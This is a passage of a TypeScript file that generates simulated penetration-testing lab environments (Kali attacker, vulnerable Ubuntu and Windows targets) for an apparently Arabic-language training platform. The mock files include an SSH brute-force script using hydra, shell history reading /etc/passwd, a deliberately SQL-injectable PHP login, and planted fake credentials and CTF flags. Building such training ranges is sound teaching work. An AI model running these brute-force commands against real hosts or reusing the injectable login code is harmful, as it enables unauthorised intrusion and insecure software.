import type { CyberEnvironment, VirtualMachine, FSNode, VMService, VMUser, VMProcess, EnvironmentPreset, EnvironmentSetupRequest, OSType, MachineRole } from "./cyber-env-types";

export const ENV_PRESETS: EnvironmentPreset[] = [
  { id: "linux-pentest", nameAr: "اختبار اختراق Linux", nameEn: "Linux Pentest", icon: "🐧", descriptionAr: "بيئة Kali Linux + خادم Linux هدف مع خدمات مفتوحة", color: "from-emerald-500/20 to-emerald-900/20", category: "offensive" },
  { id: "windows-pentest", nameAr: "اختبار اختراق Windows", nameEn: "Windows Pentest", icon: "🪟", descriptionAr: "بيئة Kali Linux + جهاز Windows هدف مع ثغرات", color: "from-blue-500/20 to-blue-900/20", category: "offensive" },
  { id: "web-security", nameAr: "أمن تطبيقات الويب", nameEn: "Web App Security", icon: "🌐", descriptionAr: "خادم ويب مع ثغرات OWASP + أدوات اختبار", color: "from-purple-500/20 to-purple-900/20", category: "offensive" },
  { id: "network-analysis", nameAr: "تحليل الشبكات", nameEn: "Network Analysis", icon: "📡", descriptionAr: "عدة أجهزة مترابطة لتحليل حركة الشبكة", color: "from-cyan-500/20 to-cyan-900/20", category: "defensive" },
  { id: "password-cracking", nameAr: "كسر كلمات المرور", nameEn: "Password Cracking", icon: "🔑", descriptionAr: "أدوات كسر كلمات المرور + خدمات بكلمات ضعيفة", color: "from-orange-500/20 to-orange-900/20", category: "offensive" },
  { id: "privilege-escalation", nameAr: "تصعيد الصلاحيات", nameEn: "Privilege Escalation", icon: "⬆️", descriptionAr: "نظام بصلاحيات محدودة — هدفك الوصول لـ root", color: "from-red-500/20 to-red-900/20", category: "offensive" },
  { id: "forensics", nameAr: "تحليل جنائي رقمي", nameEn: "Digital Forensics", icon: "🔍", descriptionAr: "جهاز مخترق — حلّل الأدلة واكتشف المهاجم", color: "from-amber-500/20 to-amber-900/20", category: "defensive" },
  { id: "network-defense", nameAr: "أمن الشبكات والدفاع", nameEn: "Network Defense", icon: "🛡️", descriptionAr: "إعداد جدران نارية وكشف التسلل وحماية الشبكة", color: "from-green-500/20 to-green-900/20", category: "defensive" },
];

let envCounter = 0;
function genId(): string {
  return `env-${Date.now()}-${++envCounter}`;
}

function randomMAC(): string {
  const h = () => Math.floor(Math.random() * 256).toString(16).padStart(2, "0");
  return `02:42:${h()}:${h()}:${h()}:${h()}`;
}

function buildKaliFS(hostname: string, ip: string, networkHosts: string): FSNode {
  return {
    type: "dir", children: {
      home: { type: "dir", children: {
        kali: { type: "dir", children: {
          Desktop: { type: "dir", children: {} },
          Documents: { type: "dir", children: {
            "notes.txt": { type: "file", content: "# ملاحظات اختبار الاختراق\n- مسح الشبكة أولاً\n- تحديد الخدمات المفتوحة\n- البحث عن الثغرات\n- محاولة الاستغلال" },
          }},
          Downloads: { type: "dir", children: {} },
          tools: { type: "dir", children: {
            "recon.sh": { type: "file", content: "#!/bin/bash\necho '[*] Starting reconnaissance...'\nnmap -sV -sC $1\necho '[*] Scan complete'", executable: true },
            "bruteforce.sh": { type: "file", content: "#!/bin/bash\necho '[*] Starting brute force attack on $1'\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$1\necho '[*] Attack complete'", executable: true },
          }},
          ".bashrc": { type: "file", content: "export PS1='\\[\\e[31m\\]kali@" + hostname + "\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]\\$ '\nexport PATH=$PATH:/usr/local/bin\nalias ll='ls -la'\nalias nse='ls /usr/share/nmap/scripts/'" },
          ".bash_history": { type: "file", content: "nmap -sV 192.168.1.50\nhydra -l admin -P rockyou.txt ssh://192.168.1.50\nssh admin@192.168.1.50\ncat /etc/passwd" },
        }}
      }},
      etc: { type: "dir", children: {
        passwd: { type: "file", content: `root:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000:Kali User:/home/kali:/bin/bash\nnobody:x:65534:65534:Nobody:/nonexistent:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsshd:x:74:74:sshd:/var/empty/sshd:/sbin/nologin` },
        shadow: { type: "file", content: "root:$6$rounds=656000$salt$hash...:19750:0:99999:7:::\nkali:$6$rounds=656000$salt$hash...:19750:0:99999:7:::", permissions: "-rw-r-----", owner: "root" },
        hostname: { type: "file", content: hostname },
        hosts: { type: "file", content: `127.0.0.1\tlocalhost\n${ip}\t${hostname}\n${networkHosts}` },
        "resolv.conf": { type: "file", content: "nameserver 8.8.8.8\nnameserver 1.1.1.1" },
        ssh: { type: "dir", children: {
          sshd_config: { type: "file", content: "Port 22\nPermitRootLogin no\nPasswordAuthentication yes\nPubkeyAuthentication yes\nMaxAuthTries 6\nX11Forwarding no" },
          ssh_config: { type: "file", content: "Host *\n  ServerAliveInterval 60\n  ServerAliveCountMax 3" },
        }},
        network: { type: "dir", children: {
          interfaces: { type: "file", content: `auto lo\niface lo inet loopback\n\nauto eth0\niface eth0 inet static\n  address ${ip}\n  netmask 255.255.255.0\n  gateway 192.168.1.1` }
        }},
      }},
      usr: { type: "dir", children: {
        bin: { type: "dir", children: {
          nmap: { type: "file", content: "nmap binary", executable: true },
          hydra: { type: "file", content: "hydra binary", executable: true },
          john: { type: "file", content: "john binary", executable: true },
          gobuster: { type: "file", content: "gobuster binary", executable: true },
          nikto: { type: "file", content: "nikto binary", executable: true },
          sqlmap: { type: "file", content: "sqlmap binary", executable: true },
          netcat: { type: "file", content: "netcat binary", executable: true },
          curl: { type: "file", content: "curl binary", executable: true },
          wget: { type: "file", content: "wget binary", executable: true },
          tcpdump: { type: "file", content: "tcpdump binary", executable: true },
          dirb: { type: "file", content: "dirb binary", executable: true },
          hashcat: { type: "file", content: "hashcat binary", executable: true },
          msfconsole: { type: "file", content: "msfconsole binary", executable: true },
        }},
        share: { type: "dir", children: {
          wordlists: { type: "dir", children: {
            "rockyou.txt": { type: "file", content: "123456\npassword\n12345678\nqwerty\n123456789\n12345\n1234\n111111\n1234567\ndragon\n123123\nbaseball\nabc123\nfootball\nmonkey\nletmein\nshadow\nmaster\n666666\nqwertyuiop\n123321\nmustang\n1234567890\nmichael\n654321\nsuperman\n1qaz2wsx\n7777777\n121212\n000000\nqazwsx\n123qwe\nkiller\ntrustno1\njordan\njennifer\nzxcvbnm\nasdfgh\nhunter\nbuster\nsoccer\nharley\nbatman\nandrew\ntigger\nsunshine\niloveyou\n2000\ncharlie\nrobert\nthomas\nhockey\nranger\ndaniel\nstarwars\nklaster\n112233\ngeorge\ncomputer\nmichelle\njessica\npepper\n1111\nzxcvbn\n555555\n11111111\n131313\nfreedom\n777777\npass\nmaggie\n159753\naaaaaa\nginger\nprincess\njoshua\ncheese\namanda\nsummer\nlove\nashley\nnicole\nchelsea\nbiteme\nmatthew\naccess\nyankees\n987654321\ndallas\naustin\nthunder\ntaylor\nmatrix\nminemine" },
            "common-passwords.txt": { type: "file", content: "admin\npassword\n123456\nroot\ntoor\ntest\nuser\ndefault\nguest\nqwerty\nabc123\nletmein\nwelcome\npassword1\nadmin123\n1234\n12345\nmaster\nlogin" },
          }},
          nmap: { type: "dir", children: {
            scripts: { type: "dir", children: {
              "http-enum.nse": { type: "file", content: "-- HTTP Enumeration script" },
              "ssh-brute.nse": { type: "file", content: "-- SSH Brute Force script" },
              "smb-vuln-ms17-010.nse": { type: "file", content: "-- EternalBlue check" },
              "vuln.nse": { type: "file", content: "-- Vulnerability scanner" },
            }}
          }},
          exploitdb: { type: "dir", children: {
            "exploits.csv": { type: "file", content: "id,description,platform\n1,Apache Struts RCE,linux\n2,EternalBlue SMB,windows\n3,ShellShock Bash,linux\n4,MS08-067 NetAPI,windows" },
          }},
        }},
        local: { type: "dir", children: {
          bin: { type: "dir", children: {} }
        }},
      }},
      var: { type: "dir", children: {
        log: { type: "dir", children: {
          syslog: { type: "file", content: "" },
          "auth.log": { type: "file", content: "" },
        }},
      }},
      tmp: { type: "dir", children: {
        ".gitkeep": { type: "file", content: "" },
      }},
      root: { type: "dir", children: {
        ".bashrc": { type: "file", content: "export PS1='\\[\\e[31m\\]root@" + hostname + "\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]# '" },
      }},
      opt: { type: "dir", children: {
        metasploit: { type: "dir", children: {
          "msfconsole": { type: "file", content: "metasploit framework", executable: true },
        }},
      }},
      proc: { type: "dir", children: {
        version: { type: "file", content: "Linux version 6.1.0-kali9-amd64 (devel@kali.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1kali1" },
        cpuinfo: { type: "file", content: "processor\t: 0\nvendor_id\t: GenuineIntel\nmodel name\t: Intel(R) Core(TM) i7-10700K\ncpu MHz\t\t: 3800.000\ncache size\t: 16384 KB\ncpu cores\t: 8" },
        meminfo: { type: "file", content: "MemTotal:       16384000 kB\nMemFree:         8192000 kB\nMemAvailable:   12288000 kB\nBuffers:          512000 kB\nCached:          3072000 kB\nSwapTotal:       4096000 kB\nSwapFree:        4096000 kB" },
      }},
    }
  };
}

function buildUbuntuServerFS(hostname: string, ip: string, networkHosts: string, services: VMService[]): FSNode {
  const hasWeb = services.some(s => s.name === "http" || s.name === "apache");
  const hasFtp = services.some(s => s.name === "ftp");
  const hasMySQL = services.some(s => s.name === "mysql");

  const wwwChildren: Record<string, FSNode> = {};
  if (hasWeb) {
    const webSvc = services.find(s => s.name === "http" || s.name === "apache");
    if (webSvc?.webContent) {
      for (const [path, content] of Object.entries(webSvc.webContent)) {
        wwwChildren[path] = { type: "file", content };
      }
    } else {
      wwwChildren["index.html"] = { type: "file", content: "<html>\n<head><title>Target Server</title></head>\n<body>\n<h1>Welcome to Target Server</h1>\n<p>This server is running Apache/2.4.52</p>\n<!-- TODO: remove debug page -->\n</body>\n</html>" };
      wwwChildren["robots.txt"] = { type: "file", content: "User-agent: *\nDisallow: /admin/\nDisallow: /backup/\nDisallow: /config/" };
      wwwChildren["admin"] = { type: "dir", children: {
        "login.php": { type: "file", content: "<?php\n// Admin login page\n$user = $_POST['username'];\n$pass = $_POST['password'];\n$sql = \"SELECT * FROM users WHERE username='$user' AND password='$pass'\";\n// WARNING: SQL Injection vulnerability!\n?>" },
        "config.php": { type: "file", content: "<?php\n$db_host = 'localhost';\n$db_user = 'root';\n$db_pass = 'mysql_r00t_p@ss';\n$db_name = 'webapp';\n?>" },
      }};
      wwwChildren["backup"] = { type: "dir", children: {
        "db_backup.sql": { type: "file", content: "-- MySQL dump\nCREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(255));\nINSERT INTO users VALUES (1, 'admin', 'admin123');\nINSERT INTO users VALUES (2, 'manager', 'manager2024');\nINSERT INTO users VALUES (3, 'user', 'password123');" },
      }};
    }
  }

  const ftpChildren: Record<string, FSNode> = {};
  if (hasFtp) {
    ftpChildren["public"] = { type: "dir", children: {
      "readme.txt": { type: "file", content: "Welcome to the FTP server.\nPlease upload files to the /upload directory." },
      "company-data.csv": { type: "file", content: "name,email,role\nAhmed Ali,ahmed@company.com,admin\nSara Hassan,sara@company.com,developer\nOmar Khalid,omar@company.com,intern" },
    }};
    ftpChildren["upload"] = { type: "dir", children: {} };
    ftpChildren["confidential"] = { type: "dir", children: {
      "credentials.txt": { type: "file", content: "SSH Root Password: toor123\nMySQL Root: mysql_r00t_p@ss\nAdmin Panel: admin / admin123\nBackup Key: bk_2024_s3cr3t" },
      "FLAG.txt": { type: "file", content: "FLAG{ftp_4n0nym0us_4cc3ss}" },
    }};
  }

  const mysqlChildren: Record<string, FSNode> = {};
  if (hasMySQL) {
    mysqlChildren["mysql"] = { type: "dir", children: {
      "my.cnf": { type: "file", content: "[mysqld]\nport=3306\nbind-address=0.0.0.0\nskip-networking=false\nlog-error=/var/log/mysql/error.log" },
    }};
  }

  return {
    type: "dir", children: {
      home: { type: "dir", children: {
        admin: { type: "dir", children: {
          ".bashrc": { type: "file", content: `export PS1='\\u@${hostname}:\\w\\$ '` },
          ".bash_history": { type: "file", content: "sudo systemctl restart apache2\nmysql -u root -p\ncat /var/log/auth.log\ntail -f /var/log/syslog" },
          ".ssh": { type: "dir", children: {
            authorized_keys: { type: "file", content: "ssh-rsa AAAAB3NzaC1yc2EAAAA... admin@workstation" },
          }},
          Documents: { type: "dir", children: {
            "server-notes.txt": { type: "file", content: "Server Setup Notes:\n- SSH on port 22\n- Apache on port 80\n- MySQL on port 3306\n- Backup runs daily at 2 AM\n- Admin password changed to: s3rv3r_2024!" },
            "FLAG.txt": { type: "file", content: "FLAG{y0u_f0und_th3_s3rv3r_fl4g}" },
          }},
        }},
        user1: { type: "dir", children: {
          ".bashrc": { type: "file", content: `export PS1='\\u@${hostname}:\\w\\$ '` },
          "todo.txt": { type: "file", content: "- Change my password (still using the default one)\n- Ask admin about backup access\n- Review server logs" },
        }},
      }},
      etc: { type: "dir", children: {
        passwd: { type: "file", content: `root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash\nuser1:x:1001:1001:User:/home/user1:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL:/var/lib/mysql:/bin/false\nftp:x:21:21:FTP:/srv/ftp:/usr/sbin/nologin\nsshd:x:74:74:sshd:/var/empty/sshd:/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin` },
        shadow: { type: "file", content: "root:$6$xyz$toor123hash...:19750:0:99999:7:::\nadmin:$6$abc$s3rv3r2024hash...:19750:0:99999:7:::\nuser1:$6$def$password123hash...:19750:0:99999:7:::", permissions: "-rw-r-----", owner: "root" },
        hostname: { type: "file", content: hostname },
        hosts: { type: "file", content: `127.0.0.1\tlocalhost\n${ip}\t${hostname}\n${networkHosts}` },
        "resolv.conf": { type: "file", content: "nameserver 8.8.8.8\nnameserver 1.1.1.1" },
        ssh: { type: "dir", children: {
          sshd_config: { type: "file", content: "Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\nMaxAuthTries 6\nUsePAM yes\nX11Forwarding yes\nPrintMotd yes\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server" },
        }},
        apache2: hasWeb ? { type: "dir", children: {
          "apache2.conf": { type: "file", content: "ServerRoot \"/etc/apache2\"\nListen 80\nServerName localhost\nDocumentRoot /var/www/html\n<Directory /var/www/html>\n  Options Indexes FollowSymLinks\n  AllowOverride All\n  Require all granted\n</Directory>" },
          "sites-enabled": { type: "dir", children: {
            "000-default.conf": { type: "file", content: "<VirtualHost *:80>\n  ServerAdmin webmaster@localhost\n  DocumentRoot /var/www/html\n  ErrorLog ${APACHE_LOG_DIR}/error.log\n  CustomLog ${APACHE_LOG_DIR}/access.log combined\n</VirtualHost>" },
          }},
        }} : { type: "dir", children: {} },
        ...mysqlChildren,
        crontab: { type: "file", content: "# m h dom mon dow user command\n0 2 * * * root /usr/local/bin/backup.sh\n*/5 * * * * root /usr/bin/check-health.sh" },
        network: { type: "dir", children: {
          interfaces: { type: "file", content: `auto lo\niface lo inet loopback\n\nauto eth0\niface eth0 inet static\n  address ${ip}\n  netmask 255.255.255.0\n  gateway 192.168.1.1` },
        }},
      }},
      var: { type: "dir", children: {
        www: hasWeb ? { type: "dir", children: { html: { type: "dir", children: wwwChildren } } } : { type: "dir", children: {} },
        log: { type: "dir", children: {
          syslog: { type: "file", content: `Jan 15 00:00:01 ${hostname} CRON[1234]: (root) CMD (/usr/local/bin/backup.sh)\nJan 15 02:00:00 ${hostname} backup.sh: Backup completed successfully\nJan 15 03:22:10 ${hostname} sshd[5678]: Connection from 10.0.0.99 port 44322\nJan 15 03:22:11 ${hostname} sshd[5678]: Failed password for root from 10.0.0.99\nJan 15 03:22:13 ${hostname} sshd[5678]: Failed password for root from 10.0.0.99\nJan 15 03:22:15 ${hostname} sshd[5678]: Failed password for admin from 10.0.0.99\nJan 15 06:00:00 ${hostname} kernel: [UFW BLOCK] IN=eth0 SRC=45.33.32.156 PROTO=TCP DPT=3389` },
          "auth.log": { type: "file", content: `Jan 15 03:22:11 ${hostname} sshd[5678]: Failed password for root from 10.0.0.99 port 44322 ssh2\nJan 15 03:22:13 ${hostname} sshd[5678]: Failed password for root from 10.0.0.99 port 44322 ssh2\nJan 15 03:22:15 ${hostname} sshd[5678]: Failed password for admin from 10.0.0.99 port 44322 ssh2\nJan 15 03:22:17 ${hostname} sshd[5678]: Accepted password for admin from 192.168.1.100 port 52100 ssh2\nJan 15 04:00:00 ${hostname} sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow\nJan 15 08:15:22 ${hostname} sshd[9012]: Accepted password for user1 from 192.168.1.10 port 48900 ssh2` },
          apache2: hasWeb ? { type: "dir", children: {
            "access.log": { type: "file", content: `192.168.1.100 - - [15/Jan/2024:10:00:01 +0000] "GET / HTTP/1.1" 200 1234\n192.168.1.100 - - [15/Jan/2024:10:00:02 +0000] "GET /admin/ HTTP/1.1" 200 567\n10.0.0.99 - - [15/Jan/2024:10:05:00 +0000] "GET /admin/login.php HTTP/1.1" 200 890\n10.0.0.99 - - [15/Jan/2024:10:05:01 +0000] "POST /admin/login.php HTTP/1.1" 302 0\n10.0.0.99 - - [15/Jan/2024:10:05:02 +0000] "GET /backup/db_backup.sql HTTP/1.1" 200 4567` },
            "error.log": { type: "file", content: `[Thu Jan 15 10:05:01.123456 2024] [php:notice] SQL query: SELECT * FROM users WHERE username='admin' AND password='admin123'\n[Thu Jan 15 10:05:03.789012 2024] [core:error] [pid 1234] [client 10.0.0.99:45678] File does not exist: /var/www/html/wp-admin` },
          }} : { type: "dir", children: {} },
          mysql: hasMySQL ? { type: "dir", children: {
            "error.log": { type: "file", content: `2024-01-15T00:00:01.000000Z 0 [System] [MY-010116] mysqld: ready for connections.\n2024-01-15T10:05:01.000000Z 5 [Warning] [MY-010055] IP address '10.0.0.99' could not be resolved.` },
          }} : { type: "dir", children: {} },
        }},
        lib: hasMySQL ? { type: "dir", children: {
          mysql: { type: "dir", children: {
            webapp: { type: "dir", children: {
              "users.frm": { type: "file", content: "MySQL table: users" },
              "sessions.frm": { type: "file", content: "MySQL table: sessions" },
            }},
          }},
        }} : { type: "dir", children: {} },
      }},
      srv: hasFtp ? { type: "dir", children: { ftp: { type: "dir", children: ftpChildren } } } : { type: "dir", children: {} },
      tmp: { type: "dir", children: {
        ".gitkeep": { type: "file", content: "" },
      }},
      root: { type: "dir", children: {
        ".bashrc": { type: "file", content: `export PS1='root@${hostname}:\\w# '` },
        ".bash_history": { type: "file", content: "systemctl restart apache2\nmysql -u root -p\nufw status\ncat /var/log/auth.log | grep Failed\nnetstat -tlnp" },
        "backup-key.txt": { type: "file", content: "Backup encryption key: bk_2024_s3cr3t_k3y_d0_n0t_sh4r3\nLast backup: 2024-01-15 02:00:00\nBackup location: /mnt/backup/daily/" },
        "FLAG.txt": { type: "file", content: "FLAG{r00t_4cc3ss_4ch13v3d}" },
      }},
      usr: { type: "dir", children: {
        bin: { type: "dir", children: {} },
        local: { type: "dir", children: {
          bin: { type: "dir", children: {
            "backup.sh": { type: "file", content: "#!/bin/bash\n# Backup script - runs daily at 2 AM\nmysqldump -u root -pmysql_r00t_p@ss webapp > /mnt/backup/daily/db_$(date +%Y%m%d).sql\ntar -czf /mnt/backup/daily/www_$(date +%Y%m%d).tar.gz /var/www/html/\necho \"Backup completed: $(date)\" >> /var/log/backup.log", executable: true },
          }},
        }},
      }},
      proc: { type: "dir", children: {
        version: { type: "file", content: "Linux version 5.15.0-91-generic (buildd@lcy02-amd64-051) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0) #101-Ubuntu SMP" },
        cpuinfo: { type: "file", content: "processor\t: 0\nvendor_id\t: GenuineIntel\nmodel name\t: Intel(R) Xeon(R) E-2288G\ncpu MHz\t\t: 3700.000\ncache size\t: 16384 KB\ncpu cores\t: 4" },
        meminfo: { type: "file", content: "MemTotal:        8192000 kB\nMemFree:         2048000 kB\nMemAvailable:    4096000 kB\nBuffers:          256000 kB\nCached:          1536000 kB" },
      }},
      opt: { type: "dir", children: {} },
    }
  };
}

function buildWindowsFS(hostname: string, ip: string): FSNode {
  return {
    type: "dir", children: {
      "C:": { type: "dir", children: {
        Users: { type: "dir", children: {
          Administrator: { type: "dir", children: {
            Desktop: { type: "dir", children: {
              "passwords.txt": { type: "file", content: "WiFi: CompanyWiFi_2024\nServer SSH: admin / s3rv3r_2024!\nDatabase: root / mysql_r00t_p@ss\nVPN: vpnuser / vpn@ccess123" },
              "FLAG.txt": { type: "file", content: "FLAG{w1nd0ws_d3skt0p_pwn3d}" },
              "company-report.docx": { type: "file", content: "[Binary Document]\nCompany Quarterly Report Q4 2024\nRevenue: $2.4M\nEmployees: 150\nConfidential" },
            }},
            Documents: { type: "dir", children: {
              "network-diagram.txt": { type: "file", content: "=== Company Network ===\nRouter: 192.168.1.1\nDC: 192.168.1.10\nFile Server: 192.168.1.20\nWeb Server: 192.168.1.50\nDMZ: 10.0.0.0/24" },
              Projects: { type: "dir", children: {
                "database-creds.txt": { type: "file", content: "Production DB: prod-db.internal\nUser: db_admin\nPass: Pr0d_DB_2024!\nPort: 3306" },
              }},
            }},
            Downloads: { type: "dir", children: {} },
            AppData: { type: "dir", children: {
              Local: { type: "dir", children: {
                Temp: { type: "dir", children: {} },
              }},
              Roaming: { type: "dir", children: {
                Microsoft: { type: "dir", children: {
                  "Credentials": { type: "dir", children: {
                    "cached_creds.dat": { type: "file", content: "[Encrypted Credential Data]\nDomain: COMPANY.LOCAL\nUser: Administrator\nCached: 2024-01-10" },
                  }},
                }},
              }},
            }},
          }},
          guest: { type: "dir", children: {
            Desktop: { type: "dir", children: {} },
            Documents: { type: "dir", children: {} },
          }},
          Public: { type: "dir", children: {
            "shared-notes.txt": { type: "file", content: "Meeting Notes - Jan 2024\n- New password policy: 8 chars minimum\n- VPN access requires 2FA (not yet enforced)\n- Backup server moved to 192.168.1.30" },
          }},
        }},
        Windows: { type: "dir", children: {
          System32: { type: "dir", children: {
            config: { type: "dir", children: {
              SAM: { type: "file", content: "[Windows Security Accounts Manager Database]", permissions: "SYSTEM" },
              SYSTEM: { type: "file", content: "[Windows System Registry Hive]", permissions: "SYSTEM" },
              SECURITY: { type: "file", content: "[Windows Security Registry Hive]", permissions: "SYSTEM" },
            }},
            drivers: { type: "dir", children: {
              etc: { type: "dir", children: {
                hosts: { type: "file", content: `# Windows Hosts File\n127.0.0.1\tlocalhost\n${ip}\t${hostname}\n192.168.1.10\tdc01.company.local\n192.168.1.20\tfileserver.company.local` },
                services: { type: "file", content: "# Services\nhttp\t80/tcp\nhttps\t443/tcp\nftp\t21/tcp\nssh\t22/tcp\nsmb\t445/tcp\nrdp\t3389/tcp\nmssql\t1433/tcp" },
              }},
            }},
          }},
          Temp: { type: "dir", children: {} },
        }},
        "Program Files": { type: "dir", children: {
          "Microsoft Office": { type: "dir", children: {} },
          "Windows Defender": { type: "dir", children: {} },
          OpenSSH: { type: "dir", children: {
            "sshd.exe": { type: "file", content: "OpenSSH Server binary" },
          }},
        }},
        "Program Files (x86)": { type: "dir", children: {} },
        inetpub: { type: "dir", children: {
          wwwroot: { type: "dir", children: {
            "index.html": { type: "file", content: "<html><head><title>IIS Windows Server</title></head><body><h1>Windows Server - IIS</h1><p>Default IIS Page</p></body></html>" },
            "web.config": { type: "file", content: "<?xml version=\"1.0\"?>\n<configuration>\n  <connectionStrings>\n    <add name=\"MainDB\" connectionString=\"Server=localhost;Database=webapp;User=sa;Password=SA_p@ss2024!\" />\n  </connectionStrings>\n</configuration>" },
          }},
        }},
        Temp: { type: "dir", children: {} },
      }},
    }
  };
}

function makeSSHService(version?: string): VMService {
  return { name: "ssh", port: 22, protocol: "tcp", version: version || "OpenSSH 8.2p1 Ubuntu 4ubuntu0.5", running: true, banner: "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5", vulnerabilities: [] };
}

function makeHTTPService(version?: string, vulns?: string[]): VMService {
  return {
    name: "http", port: 80, protocol: "tcp", version: version || "Apache httpd 2.4.52",
    running: true, banner: "HTTP/1.1 200 OK\nServer: Apache/2.4.52 (Ubuntu)",
    vulnerabilities: vulns || ["Directory listing enabled", "SQL Injection in login form", "Backup file exposed"],
    webContent: {
      "index.html": "<html><body><h1>Welcome</h1></body></html>",
      "robots.txt": "User-agent: *\nDisallow: /admin/\nDisallow: /backup/",
    }
  };
}

function makeFTPService(): VMService {
  return { name: "ftp", port: 21, protocol: "tcp", version: "vsftpd 3.0.5", running: true, banner: "220 (vsFTPd 3.0.5)", vulnerabilities: ["Anonymous login allowed"], ftpFiles: ["readme.txt", "company-data.csv", "confidential/credentials.txt"] };
}

function makeMySQLService(): VMService {
  return {
    name: "mysql", port: 3306, protocol: "tcp", version: "MySQL 5.7.38", running: true,
    banner: "5.7.38-0ubuntu0.22.04.1", vulnerabilities: ["Weak root password", "Remote root access enabled"],
    dbTables: {
      users: [["id", "username", "password"], ["1", "admin", "admin123"], ["2", "manager", "manager2024"], ["3", "user", "password123"]],
      sessions: [["id", "user_id", "token"], ["1", "1", "abc123token"], ["2", "2", "def456token"]],
    },
  };
}

function makeSMBService(): VMService {
  return { name: "smb", port: 445, protocol: "tcp", version: "Samba 4.15.13", running: true, banner: "SMB", vulnerabilities: ["Guest access to shares", "EternalBlue (MS17-010)"], smbShares: { "Public": ["shared-notes.txt", "company-docs/"], "Admin$": ["RESTRICTED"], "C$": ["RESTRICTED"] } };
}

function makeRDPService(): VMService {
  return { name: "rdp", port: 3389, protocol: "tcp", version: "Microsoft Terminal Services", running: true, banner: "RDP", vulnerabilities: ["NLA not enforced", "BlueKeep potential"] };
}

function makeSMTPService(): VMService {
  return { name: "smtp", port: 25, protocol: "tcp", version: "Postfix 3.6.4", running: true, banner: "220 mail.target.local ESMTP Postfix", vulnerabilities: ["Open relay"] };
}

function makeDNSService(): VMService {
  return { name: "dns", port: 53, protocol: "udp", version: "BIND 9.18.12", running: true, banner: "DNS", vulnerabilities: ["Zone transfer allowed"] };
}

function makeProcesses(os: string, services: VMService[]): VMProcess[] {
  const procs: VMProcess[] = [
    { pid: 1, user: "root", cpu: "0.0", mem: "0.5", command: os.includes("windows") ? "System" : "systemd" },
  ];
  let pid = 100;
  if (!os.includes("windows")) {
    procs.push({ pid: ++pid, user: "root", cpu: "0.0", mem: "0.2", command: "/usr/sbin/cron" });
    procs.push({ pid: ++pid, user: "root", cpu: "0.1", mem: "0.3", command: "/usr/sbin/rsyslogd" });
  }
  for (const svc of services) {
    if (svc.running) {
      if (svc.name === "ssh") procs.push({ pid: ++pid, user: "root", cpu: "0.0", mem: "0.3", command: "/usr/sbin/sshd -D" });
      if (svc.name === "http" || svc.name === "apache") procs.push({ pid: ++pid, user: "www-data", cpu: "0.2", mem: "1.2", command: "/usr/sbin/apache2 -k start" });
      if (svc.name === "mysql") procs.push({ pid: ++pid, user: "mysql", cpu: "0.5", mem: "3.4", command: "/usr/sbin/mysqld" });
      if (svc.name === "ftp") procs.push({ pid: ++pid, user: "root", cpu: "0.0", mem: "0.1", command: "/usr/sbin/vsftpd" });
      if (svc.name === "smb") procs.push({ pid: ++pid, user: "root", cpu: "0.1", mem: "0.8", command: "/usr/sbin/smbd -D" });
      if (svc.name === "smtp") procs.push({ pid: ++pid, user: "root", cpu: "0.0", mem: "0.4", command: "/usr/lib/postfix/sbin/master" });
      if (svc.name === "dns") procs.push({ pid: ++pid, user: "bind", cpu: "0.1", mem: "0.6", command: "/usr/sbin/named -u bind" });
    }
  }
  return procs;
}

function buildNetworkHosts(machines: Array<{ hostname: string; ip: string }>): string {
  return machines.map(m => `${m.ip}\t${m.hostname}`).join("\n");
}

export function generateEnvironment(req: EnvironmentSetupRequest): CyberEnvironment {
  const preset = ENV_PRESETS.find(p => p.id === req.presetId);
  const network = { subnet: "192.168.1.0/24", netmask: "255.255.255.0", gateway: "192.168.1.1", dns: "8.8.8.8" };

  switch (req.presetId) {
    case "linux-pentest": return buildLinuxPentestEnv(req, network);
    case "windows-pentest": return buildWindowsPentestEnv(req, network);
    case "web-security": return buildWebSecurityEnv(req, network);
    case "network-analysis": return buildNetworkAnalysisEnv(req, network);
    case "password-cracking": return buildPasswordCrackingEnv(req, network);
    case "privilege-escalation": return buildPrivilegeEscalationEnv(req, network);
    case "forensics": return buildForensicsEnv(req, network);
    case "network-defense": return buildNetworkDefenseEnv(req, network);
    default: return buildLinuxPentestEnv(req, network);
  }
}

function buildLinuxPentestEnv(req: EnvironmentSetupRequest, network: { subnet: string; netmask: string; gateway: string; dns: string }): CyberEnvironment {
  const machinesInfo = [
    { hostname: "kali-attacker", ip: "192.168.1.100" },
    { hostname: "target-server", ip: "192.168.1.50" },
  ];
  const networkHosts = buildNetworkHosts(machinesInfo);

  const targetServices: VMService[] = [
    makeSSHService(),
    makeHTTPService(),
    makeFTPService(),
    makeMySQLService(),
  ];

  const attacker: VirtualMachine = {
    id: "kali-1", hostname: "kali-attacker", ip: "192.168.1.100", mac: randomMAC(),
    os: "kali-linux", osLabel: "Kali Linux 2024.1", role: "attacker",
    users: [
      { username: "kali", password: "kali", isRoot: false, home: "/home/kali", shell: "/bin/bash", groups: ["kali", "sudo", "adm"], uid: 1000 },
      { username: "root", password: "toor", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
    ],
    currentUser: "kali",
    filesystem: buildKaliFS("kali-attacker", "192.168.1.100", networkHosts),
    services: [makeSSHService()],
    tools: ["nmap", "hydra", "john", "hashcat", "gobuster", "nikto", "sqlmap", "netcat", "curl", "wget", "tcpdump", "dirb", "msfconsole", "wireshark"],
    isAccessible: true,
